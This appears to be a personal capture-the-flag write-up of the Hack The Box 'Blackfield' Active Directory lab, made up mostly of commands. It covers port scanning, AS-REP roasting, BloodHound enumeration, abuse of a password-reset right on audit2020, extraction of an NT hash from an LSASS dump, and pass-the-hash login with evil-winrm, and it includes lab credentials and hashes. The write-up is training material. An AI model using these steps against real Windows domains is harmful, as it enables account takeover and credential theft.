#windows #active-directory 

```shell
┌─[sg-dedivip-1]─[10.10.14.64]─[ch10ro@htb-k469zlkxls]─[~/blackfield]
└──╼ [★]$ nmap -sC -sV -oN nmap/bf $IP -T5 -p- --min-rate=1000
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-28 01:26 CDT
Nmap scan report for 10.129.245.78
Host is up (0.040s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-28 13:28:02Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 6h59m59s
| smb2-time: 
|   date: 2024-09-28T13:28:09
|_  start_date: N/A


```


# smb profile$ share contains directory with the usernames of the users, I used GetNPUsers.py to check for users with no pre-auth

> Copied the directories on profile$ share then ,saved it on a file then extracted it using awk

```shell
cat users.txt | awk '{print $1}' > ldap.txt
```
```shell
GetNPUsers.py blackfield.local/ -usersfile ldap.txt -format hashcat -outputfile hashes.asrep
```

# Credentials
```shell
support:#00^BlackKnight
```

# Tried using kerberoast attack with the creds, none found
```shell
GetUserSPNs.py blackfield.local/support:"#00^BlackKnight" -dc-ip 10.129.104.92 -request
```

# Used remote bloodhound to enumerate AD 

```shell
bloodhound-python -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.129.104.92 -c ALL

```

# there is a user where the support account can change password 

```
audit2020

rpcclient <IP> -U <domain>/username

setuserinfo audit2020 23 <password>
```

> 23 - user level

# modified audit2020 user's password using 'net rpc password'

```shell
net rpc password "AUDIT2020" "Newpass@123456" -U 'blackfield.local'/'support'%'#00^BlackKnight' -S "BLACKFIELD.local" -I 10.129.129.0

```

> The domain has a strict password policy where it requires special characters, uppercase and longer password length

# Used the credentials on the forensic shares, where an LSASS dmp file is found, I used pypykatz to decrypt/read the dmp file

```shell
pypykatz lsa minidump lsass.DMP --json -p all  -o dump.json

```

# svc_backup hash credentials from lsass.dmp

```shell
 "DPAPI": "a03cd8e9d30171f3cfe8caad92fef62100000000",
                        "LMHash": null,
                        "NThash": "9658d1d1dcd9250115e2205d9f48400d",
                        "SHAHash": "463c13a9a31fc3252c68ba0a44f0221626a33e5c",
                        "domainname": "BLACKFIELD",
                        "username": "svc_backup"

```

# Used svc_backup hash to evil-wirn

```shell
 evil-winrm -i 10.129.129.0 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d

```